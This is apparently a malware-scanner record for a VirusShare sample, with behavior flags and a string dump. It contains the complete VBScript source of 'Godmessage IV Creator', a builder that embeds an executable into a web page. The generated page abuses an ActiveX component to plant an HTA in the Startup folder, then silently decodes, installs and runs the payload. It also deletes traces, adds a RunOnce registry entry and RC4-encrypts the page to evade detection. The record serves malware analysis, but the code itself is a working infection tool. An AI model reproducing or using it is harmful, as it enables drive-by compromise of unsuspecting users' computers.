{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file",
            "Xor": "May attempt to obfuscate specific str",
            "output": "May write to a file"
        },
        "macro": "'********************************************************************\n' Godmessage IV Creator v0.4\n' Author: 6IT\n' Thanks: The Pull - Creator of the original Godmessage - this is his brain child.\n' Thanks: StoneFisk - Coauthor of Godmessage IV.\n' Thanks: To all the people who helped make godmessage what it is today\n'\n' CHANGE LOG 10-18-00\n' - See Readme.txt\n'********************************************************************\nOption Explicit\n\nDim Message, Title, Text1\nDim fso, WSHSHell, exefile, htmlfile\nDim tStart, tElapsed\nDim timeout1, timeout2, timeout3\nDim state(255)\nDim key(255)\nMessage = \"Enter the name of the executable to wrap in Godmessage IV\" \nTitle = \"6IT's Godmessage IV Creator v0.4\"\nText1 = \"Sorry, user input was canceled\"\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet WSHShell = CreateObject(\"WScript.Shell\")\nConst ForReading = 1 \nConst ForAppending = 8\nexefile = InputBox(Message,Title,\"onz.exe\", 4000, 3000)\nIf exefile = \"\" Then\n\tWScript.Echo Text1\n\tWScript.Quit()\nElseIf exefile = \"onz.exe\" Then\n\n\tIf fso.FileExists(exefile) Then \n\t\tGMCreate()\n\tElse \n\t\tWScript.Echo \"File Doesn't Exist!\"\n\t\tWScript.Quit()\n\tEnd If\nElse\n\tIf fso.FileExists(exefile) Then\n\t\tfso.CopyFile exefile, \"onz.exe\", True\n\t\tGMCreate()\n\tElse \n\t\tWScript.Echo \"File Doesn't Exist!\"\n\t\tWScript.Quit()\n\tEnd If\nEnd If\nWScript.Echo \"Success! and Elapsed time=\" & tElapsed & \" seconds\"\nWScript.Quit()\n\nSub GMCreate()\nPrptHtmlFile()\nPrptTimeouts()  \nDim inputHtml, output\nSet output = fso.CreateTextFile(\"Godmessage.html\", True)\ntStart = timer()\nCheckSize()\nCreateXXE()\ninputHtml = Insert(htmlfile)\noutput.Write(InputHtml)\noutput.close\nCryptHtml()\nfso.DeleteFile \"onz.xxe\", True\ntElapsed = timer()\ntElapsed = tElapsed - tStart\nEnd Sub\n\nSub PrptHtmlFile()\nDim MessHtml\nMessHtml = \"Please enter the filename for the html file.\"\nhtmlfile = InputBox(MessHtml,Title,\"default.html\", 4000, 3000)\nIf htmlfile = \"\" Then\n\tWScript.Echo Text1\n\tWScript.Quit()\nElseIf Not fso.FileExists(htmlfile) Then\n\tWScript.Echo \"File Doesn't Exist!\"\n\tWScript.Quit()\nEnd If\nEnd Sub\n\nSub PrptTimeouts()\nDim Message1, Message2, Message3\nMessage1 = \"Enter the timeout for the 'Path' setProperty.\"\nMessage2 = \"Enter the timeout for the 'Doc' setProperty.\"\nMessage3 = \"Enter the timeout for the 'invoke' method.\"\ntimeout1 = InputBox(Message1,Title,\"15\", 4000, 3000)\ntimeout2 = InputBox(Message2,Title,\"2000\", 4000, 3000)\ntimeout3 = InputBox(Message3,Title,\"2500\", 4000, 3000)\nEnd Sub\n\nSub CheckSize()\nDim fs, fsize\nSet fs = fso.GetFile(\"onz.exe\")\nfsize = fs.Size\nIf fsize > 34500 Then\nWScript.Echo \"File is Greater Than 34500 Bytes\"\nWScript.Quit()\nEnd If\nEnd Sub\n\nSub CreateXXE()\nIf fso.FileExists(\"onz.xxe\") Then \nfso.DeleteFile \"onz.xxe\", True\nEnd If\nWSHShell.Run \"%comspec% /c xxencode.com onz.exe\",0,True\nEnd Sub\n\nFunction Insert(html)\nDim f1, i, s, strBdy \nDim regExBdy, retValBdy, retStrBdy\nReDim htmlArr(-1)\nSet f1 = fso.OpenTextFile(html, ForReading)\ni = 0\nDo While NOT f1.AtEndOfStream\ns = f1.ReadLine\nSet regExBdy = New RegExp\nregExBdy.Pattern = \"<BODY\"\nregExBdy.IgnoreCase = True\nretValBdy = regExBdy.Test(s)\nIf retValBdy Then\n\tDim regExOnL, retValOnL, retStrOnL \n\tDim MatchOnL, MatchesOnL, MatchBdy, MatchesBdy\n\tSet regExOnL = New RegExp\n\tregExOnL.Pattern = \"onLoad=\"\n\tregExOnL.IgnoreCase = True\n\tretValOnL = regExOnL.Test(s)\n\tIf retValOnL Then\n\t\tSet MatchesOnL = regExOnL.Execute(s)\n\t\tFor Each MatchOnL in MatchesOnL  \n\t\tretStrOnL = MatchOnL.FirstIndex\n\t\tNext \n\t\tstrBdy = Left(s, retStrOnL + 8) & \"f(); \" & Right(s, Len(s)-(retStrOnL + 8))\n\t\ts = strBdy\t\n\tElse\t\n\tSet MatchesBdy = regExBdy.Execute(s)\n\tFor Each MatchBdy in MatchesBdy  \n\t\tretStrBdy = MatchBdy.FirstIndex\n\tNext\n\tstrBdy = Left(s, retStrBdy + 5) & \" onLoad=\"\"f()\"\" \" & Right(s, Len(s)-(retStrBdy + 5))\n\ts = strBdy\n\tEnd If\nEnd If\nDim regExEnd, retValEnd, retStrEnd, MatchEnd, MatchesEnd\nSet regExEnd = New RegExp\nregExEnd.Pattern = \"</BODY>\"\nregExEnd.IgnoreCase = True\nretValEnd = regExEnd.Test(s)\nIf retValEnd Then\n\tSet MatchesEnd = regExEnd.Execute(s)\n\tFor Each MatchEnd in MatchesEnd  \n\t\tretStrEnd = MatchEnd.FirstIndex\n\tNext \n\tstrBdy = Left(s, retStrEnd) & GenHtml() & Right(s, Len(s)-(retStrEnd))\n\ts = strBdy\nEnd If\nReDim preserve htmlArr(i)\nhtmlArr(i) = s\ni = i + 1\nLoop\nf1.Close\nInsert = Join(htmlArr, vbNewline) \nEnd Function\n\nFunction StartHtml(setTimeout1, setTimeout2, setTimeout3)\nDim html(16)\nhtml(1) = \"<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>\"\nhtml(2) = \"<SCRIPT language=JAVASCRIPT>\"\nhtml(3) = \"a1=document.applets[0];\"\nhtml(4) = \"fn=\"\"..\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\EA.HTA\"\";\"\nhtml(5) = \"function f(){\"\nhtml(6) = \"cl=\"\"{06290BD5-48AA-11D2-8432-006008C3FBFC}\"\";\"\nhtml(7) = \"a1.setCLSID(cl);\"\nhtml(8) = \"a1.createInstance();\"\nhtml(9) = \"setTimeout(\"\"a1.setProperty('Path','\"\"+fn+\"\"')\"\",\" & setTimeout1 & \");\"\nhtml(10) = \"setTimeout(\"\"a1.setProperty('DOC',doc)\"\",\" & setTimeout2 & \");\"\nhtml(11) = \"setTimeout(\"\"a1.invoke('write',VA)\"\",\" & setTimeout3 & \");}\"\nhtml(12) = \"</SCRIPT><SCRIPT language=VBSCRIPT>\"\nhtml(13) = \"Option Explicit\"\nhtml(14) = \"Dim VA, doc\"\nhtml(15) = \"VA = ARRAY()\"\nHTML(16) = \"\"\nStartHtml = Join(html, vbNewline)\nEnd Function\n\nFunction EncodeXXE()\nDim Input, nline, nl, s, a\nDim fLine1, fLine2, fLine\nSet input = fso.OpenTextFile(\"onz.xxe\", ForReading) \nnLine = \" & vbNewline\"\nnl = \" & Chr(13) & Chr(10) & \"\ns = input.ReadLine\nfLine1 = \"set onzXxe=fso.CreateTextFile(\" & Chr(34) & Chr(34) & \"onz.xxe\" & Chr(34) & Chr(34) & \")\"\"\"\nfLine2 = \"\"\"onzXxe.WriteLine \" & Chr(34) & Chr(34) & s & Chr(34) & Chr(34)\nReDim ca(-1)\nredim preserve ca(0)\nca(0) = fLine1\nredim preserve ca(1)\nca(1) = nl\nredim preserve ca(2)\nca(2) = fLine2\nredim preserve ca(3)\nca(3) = nLine\na = 4\nDo While NOT input.AtEndOfStream\nReDim preserve ca(a)\ns = input.ReadLine\nIf s = \"\" Then\nca(a) = nLine\nElse\nfLine = \" & \" & Chr(34) & Chr(34) & s & Chr(34) & Chr(34) \nca(a) = fLine & nLine\nEnd If\na = a+1\nLoop\nReDim preserve ca(a)\nca(a) = Chr(34) & nl & \"\"\"onzXxe.close\"\"\" & nl & Chr(34)\ninput.Close \nEncodeXXE = Join(ca, \"\")\nEnd Function\n\nFunction GenHtml()\nDim nl, htmlEnd, htmlstart, f1\nnl = Chr(34) & \" & Chr(13) & Chr(10) & \" & Chr(34)\nDim ar1(5), ar2(11), data(5)\nar1(0) = \"Chr(13) & Chr(10) & \"\"<SCRIPT language=VBSCRIPT>\" & nl\nar1(1) = \"Set fso = CreateObject(\"\"\"\"Scripting.FileSystemObject\"\"\"\")\" & nl\nar1(2) = \"Set WshShell = CreateObject(\"\"\"\"WScript.Shell\"\"\"\")\" & nl\nar1(3) = \"set xxDecSrc=fso.CreateTextFile(\"\"\"\"xxdecode.src\"\"\"\")\" & nl\nar1(4) = \"xxDecSrc.WriteLine  \"\"\"\"n xxdecode.com\"\"\"\" & vbNewline & \"\"\"\"e 100 E9 A7 0 49 6E 70 75 74 20 66 69 6C 65 20 65 72 \"\"\"\" & vbNewline & \"\"\"\"e 110 72 6F 72 2E D A 4F 75 74 70 75 74 20 66 69 6C \"\"\"\" & vbNewline & \"\"\"\"e 120 65 20 65 72 72 6F 72 2E D A 73 74 61 72 74 20 \"\"\"\" & vbNewline & \"\"\"\"e 130 6E 6F 74 20 66 6F 75 6E 64 2E D A 45 6E 64 20 \"\"\"\" & vbNewline & \"\"\"\"e 140 6E 6F 74 20 66 6F 75 6E 64 2E D A 65 78 69 73 \"\"\"\" & vbNewline & \"\"\"\"e 150 74 73 2E 20 41 62 6F 72 74 69 6E 67 21 D A 0 \"\"\"\" & vbNewline & \"\"\"\"e 160 0 0 0 EA 3 EA 3 9A 3 0 2B 2D 30 31 32 33 \"\"\"\" & vbNewline & \"\"\"\"e 170 34 35 36 37 38 39 41 42 43 44 45 46 47 48 49 4A \"\"\"\" & vbNewline & \"\"\"\"e 180 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A \"\"\"\" & vbNewline & \"\"\"\"e 190 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 \"\"\"\" & vbNewline & \"\"\"\"e 1A0 71 72 73 74 75 76 77 78 79 7A E8 F0 1 E8 62 1 \"\"\"\" & vbNewline & \"\"\"\"e 1B0 BF 9A 3 E8 EF 0 AD 3D 62 65 75 F4 AD 3D 67 69 \"\"\"\" & vbNewline & \"\"\"\"e 1C0 75 EE AD 3D 6E 20 75 E8 BF 9A 3 AC 3A C4 76 FB \"\"\"\" & vbNewline & \"\"\"\"e 1D0 AC 3A C4 75 FB AC 3A C4 76 FB 3A C4 74 4 AA AC \"\"\"\" & vbNewline & \"\"\"\"e 1E0 EB F8 BA 9A 3 33 C9 88 D 80 3E 69 1 FF 74 20 \"\"\"\" & vbNewline & \"\"\"\"e 1F0 B4 4E CD 21 3C 2 74 18 3C 12 74 14 8B CF 2B CA \"\"\"\" & vbNewline & \"\"\"\"e 200 49 49 E8 3B 1 BA 4C 1 B9 13 0 B0 5 E9 24 1 \"\"\"\" & vbNewline & \"\"\"\"e 210 B4 3C CD 21 73 3 E9 F1 0 A3 61 1 BF 9A 3 E8 \"\"\"\" & vbNewline & \"\"\"\"e 220 83 0 8A 4 A C0 74 65 3C 2B 74 61 3C 20 74 5D \"\"\"\" & vbNewline & \"\"\"\"e 230 57 BB 6A 1 BA 40 0 56 AC A C0 74 12 8B FB 8B \"\"\"\" & vbNewline & \"\"\"\"e 240 CA F2 AE 75 45 8B C7 48 2B C3 88 44 FF EB E9 5E \"\"\"\" & vbNewline & \"\"\"\"e 250 5F AC 32 E4 8B E8 B9 4 6 AD 86 C4 8A D0 D0 E4 \"\"\"\" & vbNewline & \"\"\"\"e 260 D0 E4 D2 E8 A C4 AA 4D 74 B5 8A E2 AC 8A D0 D2 \"\"\"\" & vbNewline & \"\"\"\"e 270 E4 D0 E8 D0 E8 A C4 AA 4D 74 A4 8A E2 AC 8A CD \"\"\"\" & vbNewline & \"\"\"\"e 280 D2 E4 A C4 AA 4D 75 CE EB 95 E9 A1 0 E8 15 0 \"\"\"\" & vbNewline & \"\"\"\"e 290 AD 3D 65 6E 75 5 AC 3C 64 74 3 E8 9C 0 E8 51 \"\"\"\" & vbNewline & \"\"\"\"e 2A0 0 B4 4C CD 21 8B 36 63 1 89 3E 67 1 BD 43 0 \"\"\"\" & vbNewline & \"\"\"\"e 2B0 BF 4A 3 C6 5 0 3B 36 65 1 72 6 E8 33 0 E8 \"\"\"\" & vbNewline & \"\"\"\"e 2C0 50 0 AC 3C D 74 1B 3C A 74 18 AA 4D 75 E7 3B \"\"\"\" & vbNewline & \"\"\"\"e 2D0 36 65 1 72 3 E8 3A 0 AC 3C A 75 F2 BF 9A 3 \"\"\"\" & vbNewline & \"\"\"\"e 2E0 EB C7 46 C6 5 0 89 36 63 1 8B 3E 67 1 BE 4A \"\"\"\" & vbNewline & \"\"\"\"e 2F0 3 C3 BA 9A 3 8B CA 87 E 67 1 2B CA 76 A 8B \"\"\"\" & vbNewline & \"\"\"\"e 300 1E 61 1 B4 40 CD 21 72 1 C3 BA 16 1 B9 14 0 \"\"\"\" & vbNewline & \"\"\"\"e 310 EB 22 BA EA 3 B9 0 E1 8B 1E 5F 1 B4 3F CD 21 \"\"\"\" & vbNewline & \"\"\"\"e 320 72 C B C0 74 8 8B F2 3 C6 A3 65 1 C3 BA 3 \"\"\"\" & vbNewline & \"\"\"\"e 330 1 B9 13 0 E8 9 0 E9 67 FF BA 3C 1 B9 10 0 \"\"\"\" & vbNewline & \"\"\"\"e 340 50 BB 2 0 B4 40 CD 21 58 C3 54 68 69 73 20 70 \"\"\"\" & vbNewline & \"\"\"\"e 350 72 6F 67 72 61 6D 20 72 65 71 75 69 72 65 73 20 \"\"\"\" & vbNewline & \"\"\"\"e 360 44 4F 53 20 56 65 72 73 69 6F 6E 20 32 2E 30 20 \"\"\"\" & vbNewline & \"\"\"\"e 370 6F 72 20 68 69 67 68 65 72 2E D A 24 D A 49 \"\"\"\" & vbNewline & \"\"\"\"e 380 6E 70 75 74 20 70 61 74 68 2F 66 69 6C 65 3A 20 \"\"\"\" & vbNewline & \"\"\"\"e 390 20 4E 6F 20 61 63 74 69 6F 6E D A 24 B4 30 CD \"\"\"\" & vbNewline & \"\"\"\"e 3A0 21 3C 2 73 C BA 4A 3 B4 9 CD 21 B8 1 4C CD \"\"\"\" & vbNewline & \"\"\"\"e 3B0 21 E8 36 0 73 23 BA 7D 3 B9 14 0 BB 2 0 B4 \"\"\"\" & vbNewline & \"\"\"\"e 3C0 40 CD 21 BF 7F 0 C6 5 50 8B D7 B4 A CD 21 E8 \"\"\"\" & vbNewline & \"\"\"\"e 3D0 18 0 73 5 BA 91 3 EB CF BA 2C 4 B8 0 3D CD \"\"\"\" & vbNewline & \"\"\"\"e 3E0 21 72 4 A3 5F 1 C3 E9 44 FF BE 80 0 BF 2C 4 \"\"\"\" & vbNewline & \"\"\"\"e 3F0 FC AC A C0 74 2F B4 20 AC 3A C4 76 FB 3C 2F 74 \"\"\"\" & vbNewline & \"\"\"\"e 400 4 3C 2D 75 18 8B D0 8B 4 24 5F 3D 4F 20 8B C2 \"\"\"\" & vbNewline & \"\"\"\"e 410 75 B F6 16 69 1 46 46 AC 3A C4 76 A AA AC EB \"\"\"\" & vbNewline & \"\"\"\"e 420 F8 3A C4 76 2 F9 C3 C6 5 0 F8 C3 58 58 44 20 \"\"\"\" & vbNewline & \"\"\"\"e 430 76 31 2E 31 0 44 61 76 69 64 20 50 20 4B 69 72 \"\"\"\" & vbNewline & \"\"\"\"e 440 73 63 68 62 61 75 6D 2C 20 54 6F 61 64 20 48 61 \"\"\"\" & vbNewline & \"\"\"\"e 450 6C 6C 0 0 \"\"\"\" & vbNewline & \"\"\"\"rcx\"\"\"\" & vbNewline & \"\"\"\"353\"\"\"\" & vbNewline & \"\"\"\"w\"\"\"\" & vbNewline & \"\"\"\"q\"\"\"\" & vbNewline\" & nl\nar1(5) = \"xxDecSrc.close\" & nl\n\nar2(0) = \"WshShell.Run \"\"\"\"%comspec% /c debug < xxdecode.src\"\"\"\",0,True\" & nl\nar2(1) = \"WshShell.Run \"\"\"\"%comspec% /c xxdecode.com onz.xxe\"\"\"\",0,True\" & nl\nar2(2) = \"WshShell.Run \"\"\"\"%comspec% /c move onz.exe %windir%\\onz.exe\"\"\"\",0,True\" & nl\nar2(3) = \"WshShell.Run \"\"\"\"%comspec% /c %windir%\\onz.exe\"\"\"\",0,False\" & nl\nar2(4) = \"fso.DeleteFile \"\"\"\"xxdecode.src\"\"\"\", True\" & nl\nar2(5) = \"fso.DeleteFile \"\"\"\"onz.xxe\"\"\"\", True\" & nl\nar2(6) = \"fso.DeleteFile \"\"\"\"xxdecode.com\"\"\"\", True\" & nl\nar2(7) = \"strStartup = WshShell.SpecialFolders(\"\"\"\"Startup\"\"\"\")\" & nl\nar2(8) = \"sysCmd = WshShell.ExpandEnvironmentStrings(\"\"\"\"%COMSPEC%\"\"\"\")\" & nl\nar2(9) = \"regCmd = sysCmd & \"\"\"\" /c del \"\"\"\" & Chr(34) & strStartup & \"\"\"\"\\ea.hta\"\"\"\" & Chr(34)\" & nl\nar2(10) = \"WshShell.RegWrite \"\"\"\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\clean\"\"\"\", regCmd\" & nl\nar2(11) = \"<\"\" & Chr(47) & \"\"SCRIPT><BODY onload=\"\"\"\"javascript: window.close()\"\"\"\"><\"\" & Chr(47) & \"\"BODY>\"\n\ndata(0) = StartHtml(timeout1, timeout2, timeout3)\ndata(1) = \"doc = \" & Join(ar1, \"\")\ndata(2) = EncodeXXE()\ndata(3) = Join(ar2, \"\") & Chr(34)\ndata(4) = vbNewline\ndata(5) = \"</SCRIPT>\"\nGenHtml = Join(data, \"\")\nEnd Function\n\nSub CryptHtml()\nDim f1, f2, text, enc, eKey, html\nSet f1 = fso.OpenTextFile(\"godmessage.html\", ForReading)\nSet f2 = fso.CreateTextFile(\"Godmessage.HexEnc.html\", True)\neKey = RandPwd()\ntext = f1.ReadAll\nenc = EnCryptHex(text, eKey)\nhtml = WrapEnc(enc, eKey)\nf2.Write html\nf1.Close \nf2.Close \nEnd Sub\n\nSub RC4Initialize(strPwd)\nDim tempSwap, i, f, intLength \n\tintLength = len(strPwd) \n\tFor i = 0 To 255 \n\t\tkey(i) = asc(mid(strPwd, (i mod intLength)+1, 1)) \n\t\tstate(i) = i \n\tNext\nf = 0\nFor i = 0 To 255\n    f = (f + state(i) + key(i)) Mod 256\n    tempSwap = state(i)\n    state(i) = state(f)\n    state(f) = tempSwap\nNext\nEnd Sub\n\nFunction EnCryptHex(plaintxt, psw)\nDim temp, a, i, f, k, cipherby\ndim cipher()\nredim cipher(-1)\ni = 0\nf = 0\nRC4Initialize(psw)\nFor a = 1 To Len(plaintxt)\n    i = (i + 1) Mod 256\n    f = (f + state(i)) Mod 256\n    temp = state(i)\n    state(i) = state(f)\n    state(f) = temp\n    k = (state(i) + state(f)) Mod 256\n    cipherby = Asc(Mid(plaintxt, a, 1)) Xor k\n\tIf cipherby = 0 then cipherby = Asc(Mid(plaintxt, a, 1))\n\tIf cipherby < 16 Then \n\t\tcipherby = \"0\" & CStr(Hex(cipherby))\n\tElse\n\t\tcipherby = Hex(cipherby)\n\tEnd If\n\tredim preserve cipher(a-1)\n    cipher(a-1) = cipherby\nNext\nEnCryptHex = join( cipher, \"\")\nEnd Function\n\nFunction RandPwd()\nDim i, x\nReDim pwdar(-1)\nRandomize\nFor i = 0 To 31\nReDim preserve pwdar(i)\npwdar(i) = Chr(Int((122 - 42 + 1) * Rnd + 42))\nNext\nRandPwd = Join(pwdar, \"\")\nEnd Function\n\nFunction WrapEnc(encText, encKey)\nDim encHtml(48)\nencHtml(0) = \"Option Explicit\"\nencHtml(1) = \"Dim o, p, d, t, key(255), state(255)\"\nencHtml(2) = \"p = \"\"\" & encKey & Chr(34)\nencHtml(3) = \"d = \"\"\" & encText & Chr(34) & vbNewline\nencHtml(4) = \"o = DeCryptHex(d, p)\"\nencHtml(5) = \"t = setTimeout(\"\"go()\"\", 500)\"\nencHtml(6) = \"Sub go()\"\nencHtml(7) = \"Document.Write o\"\nencHtml(8) = \"Document.execCommand(\"\"Refresh\"\")\"\nencHtml(9) = \"End Sub\"\nencHtml(10) = \"Sub RC4Initialize(strPwd)\"\nencHtml(11) = \"Dim tempSwap, i, f, intLength\" \nencHtml(12) = \"intLength = len(strPwd)\" \nencHtml(13) = \"For i = 0 To 255\" \nencHtml(14) = \"key(i) = asc(mid(strPwd, (i mod intLength)+1, 1))\" \nencHtml(15) = \"state(i) = i\" \nencHtml(16) = \"Next\"\nencHtml(17) = \"f = 0\"\nencHtml(18) = \"For i = 0 To 255\"\nencHtml(19) = \"f = (f + state(i) + key(i)) Mod 256\"\nencHtml(21) = \"tempSwap = state(i)\"\nencHtml(22) = \"state(i) = state(f)\"\nencHtml(23) = \"state(f) = tempSwap\"\nencHtml(24) = \"Next\"\nencHtml(25) = \"End Sub\"\nencHtml(26) = \"Function DeCryptHex(hextext, psw)\" \nencHtml(27) = \"Dim temp, a, x, i, f, k, cipherby\"\nencHtml(28) = \"dim cipher()\"\nencHtml(29) = \"redim cipher(-1)\"\nencHtml(30) = \"x = 0\"\nencHtml(31) = \"i = 0\"\nencHtml(32) = \"f = 0\"\nencHtml(33) = \"Call RC4Initialize(psw)\"\nencHtml(34) = \"For a = 1 To Len(hextext) Step 2\"\nencHtml(35) = \"i = (i + 1) Mod 256\"\nencHtml(36) = \"f = (f + state(i)) Mod 256\"\nencHtml(37) = \"temp = state(i)\"\nencHtml(38) = \"state(i) = state(f)\"\nencHtml(39) = \"state(f) = temp\"\nencHtml(40) = \"k = (state(i) + state(f)) Mod 256\"\nencHtml(41) = \"cipherby = Asc(Chr(Eval(\"\"&H\"\" & Mid(hextext, a, 2)))) Xor k\"\nencHtml(42) = \"if cipherby = 0 then cipherby = Asc(Chr(Eval(\"\"&H\"\" & Mid(hextext, a, 2))))\" & vbNewline\nencHtml(43) = \"redim preserve cipher(x)\"\nencHtml(44) = \"cipher(x) = Chr(cipherby)\"\nencHtml(45) = \"x = x + 1\"\nencHtml(46) = \"Next\"\nencHtml(47) = \"DeCryptHex = join( cipher, \"\"\"\")\"\nencHtml(48) = \"End Function\"\nWrapEnc = \"<Script Language=VBScript>\" & vbNewLine & Join(encHtml, \" : \") & vbNewLine & \"</SCRIPT>\"\nEnd Function"
    },
    "filename": "VirusShare_0c6ab5800aa62d44cda19b365a27eeca",
    "filesize": 15639,
    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "0c6ab5800aa62d44cda19b365a27eeca",
        "sha1": "2ccdba286ec4ac32c56882da07e0638cdfe5c72d",
        "sha256": "029e324bf9ac3769a54fbfafc45a938eecef1d8a7e4641c49173203abd10aef3"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "'********************************************************************",
            "' Godmessage IV Creator v0.4",
            "' Author: 6IT",
            "' Thanks: The Pull - Creator of the original Godmessage - this is his brain child.",
            "' Thanks: StoneFisk - Coauthor of Godmessage IV.",
            "' Thanks: To all the people who helped make godmessage what it is today",
            "' CHANGE LOG 10-18-00",
            "' - See Readme.txt",
            "'********************************************************************",
            "Option Explicit",
            "Dim Message, Title, Text1",
            "Dim fso, WSHSHell, exefile, htmlfile",
            "Dim tStart, tElapsed",
            "Dim timeout1, timeout2, timeout3",
            "Dim state(255)",
            "Dim key(255)",
            "Message = \"Enter the name of the executable to wrap in Godmessage IV\" ",
            "Title = \"6IT's Godmessage IV Creator v0.4\"",
            "Text1 = \"Sorry, user input was canceled\"",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set WSHShell = CreateObject(\"WScript.Shell\")",
            "Const ForReading = 1 ",
            "Const ForAppending = 8",
            "exefile = InputBox(Message,Title,\"onz.exe\", 4000, 3000)",
            "If exefile = \"\" Then",
            "\tWScript.Echo Text1",
            "\tWScript.Quit()",
            "ElseIf exefile = \"onz.exe\" Then",
            "\tIf fso.FileExists(exefile) Then ",
            "\t\tGMCreate()",
            "\tElse ",
            "\t\tWScript.Echo \"File Doesn't Exist!\"",
            "\t\tWScript.Quit()",
            "\tEnd If",
            "Else",
            "\tIf fso.FileExists(exefile) Then",
            "\t\tfso.CopyFile exefile, \"onz.exe\", True",
            "\t\tGMCreate()",
            "\tElse ",
            "\t\tWScript.Echo \"File Doesn't Exist!\"",
            "\t\tWScript.Quit()",
            "\tEnd If",
            "End If",
            "WScript.Echo \"Success! and Elapsed time=\" & tElapsed & \" seconds\"",
            "WScript.Quit()",
            "Sub GMCreate()",
            "PrptHtmlFile()",
            "PrptTimeouts()  ",
            "Dim inputHtml, output",
            "Set output = fso.CreateTextFile(\"Godmessage.html\", True)",
            "tStart = timer()",
            "CheckSize()",
            "CreateXXE()",
            "inputHtml = Insert(htmlfile)",
            "output.Write(InputHtml)",
            "output.close",
            "CryptHtml()",
            "fso.DeleteFile \"onz.xxe\", True",
            "tElapsed = timer()",
            "tElapsed = tElapsed - tStart",
            "End Sub",
            "Sub PrptHtmlFile()",
            "Dim MessHtml",
            "MessHtml = \"Please enter the filename for the html file.\"",
            "htmlfile = InputBox(MessHtml,Title,\"default.html\", 4000, 3000)",
            "If htmlfile = \"\" Then",
            "\tWScript.Echo Text1",
            "\tWScript.Quit()",
            "ElseIf Not fso.FileExists(htmlfile) Then",
            "\tWScript.Echo \"File Doesn't Exist!\"",
            "\tWScript.Quit()",
            "End If",
            "End Sub",
            "Sub PrptTimeouts()",
            "Dim Message1, Message2, Message3",
            "Message1 = \"Enter the timeout for the 'Path' setProperty.\"",
            "Message2 = \"Enter the timeout for the 'Doc' setProperty.\"",
            "Message3 = \"Enter the timeout for the 'invoke' method.\"",
            "timeout1 = InputBox(Message1,Title,\"15\", 4000, 3000)",
            "timeout2 = InputBox(Message2,Title,\"2000\", 4000, 3000)",
            "timeout3 = InputBox(Message3,Title,\"2500\", 4000, 3000)",
            "End Sub",
            "Sub CheckSize()",
            "Dim fs, fsize",
            "Set fs = fso.GetFile(\"onz.exe\")",
            "fsize = fs.Size",
            "If fsize > 34500 Then",
            "WScript.Echo \"File is Greater Than 34500 Bytes\"",
            "WScript.Quit()",
            "End If",
            "End Sub",
            "Sub CreateXXE()",
            "If fso.FileExists(\"onz.xxe\") Then ",
            "fso.DeleteFile \"onz.xxe\", True",
            "End If",
            "WSHShell.Run \"%comspec% /c xxencode.com onz.exe\",0,True",
            "End Sub",
            "Function Insert(html)",
            "Dim f1, i, s, strBdy ",
            "Dim regExBdy, retValBdy, retStrBdy",
            "ReDim htmlArr(-1)",
            "Set f1 = fso.OpenTextFile(html, ForReading)",
            "i = 0",
            "Do While NOT f1.AtEndOfStream",
            "s = f1.ReadLine",
            "Set regExBdy = New RegExp",
            "regExBdy.Pattern = \"<BODY\"",
            "regExBdy.IgnoreCase = True",
            "retValBdy = regExBdy.Test(s)",
            "If retValBdy Then",
            "\tDim regExOnL, retValOnL, retStrOnL ",
            "\tDim MatchOnL, MatchesOnL, MatchBdy, MatchesBdy",
            "\tSet regExOnL = New RegExp",
            "\tregExOnL.Pattern = \"onLoad=\"",
            "\tregExOnL.IgnoreCase = True",
            "\tretValOnL = regExOnL.Test(s)",
            "\tIf retValOnL Then",
            "\t\tSet MatchesOnL = regExOnL.Execute(s)",
            "\t\tFor Each MatchOnL in MatchesOnL  ",
            "\t\tretStrOnL = MatchOnL.FirstIndex",
            "\t\tNext ",
            "\t\tstrBdy = Left(s, retStrOnL + 8) & \"f(); \" & Right(s, Len(s)-(retStrOnL + 8))",
            "\t\ts = strBdy\t",
            "\tElse\t",
            "\tSet MatchesBdy = regExBdy.Execute(s)",
            "\tFor Each MatchBdy in MatchesBdy  ",
            "\t\tretStrBdy = MatchBdy.FirstIndex",
            "\tNext",
            "\tstrBdy = Left(s, retStrBdy + 5) & \" onLoad=\"\"f()\"\" \" & Right(s, Len(s)-(retStrBdy + 5))",
            "\ts = strBdy",
            "\tEnd If",
            "End If",
            "Dim regExEnd, retValEnd, retStrEnd, MatchEnd, MatchesEnd",
            "Set regExEnd = New RegExp",
            "regExEnd.Pattern = \"</BODY>\"",
            "regExEnd.IgnoreCase = True",
            "retValEnd = regExEnd.Test(s)",
            "If retValEnd Then",
            "\tSet MatchesEnd = regExEnd.Execute(s)",
            "\tFor Each MatchEnd in MatchesEnd  ",
            "\t\tretStrEnd = MatchEnd.FirstIndex",
            "\tNext ",
            "\tstrBdy = Left(s, retStrEnd) & GenHtml() & Right(s, Len(s)-(retStrEnd))",
            "\ts = strBdy",
            "End If",
            "ReDim preserve htmlArr(i)",
            "htmlArr(i) = s",
            "i = i + 1",
            "Loop",
            "f1.Close",
            "Insert = Join(htmlArr, vbNewline) ",
            "End Function",
            "Function StartHtml(setTimeout1, setTimeout2, setTimeout3)",
            "Dim html(16)",
            "html(1) = \"<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>\"",
            "html(2) = \"<SCRIPT language=JAVASCRIPT>\"",
            "html(3) = \"a1=document.applets[0];\"",
            "html(4) = \"fn=\"\"..\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\EA.HTA\"\";\"",
            "html(5) = \"function f(){\"",
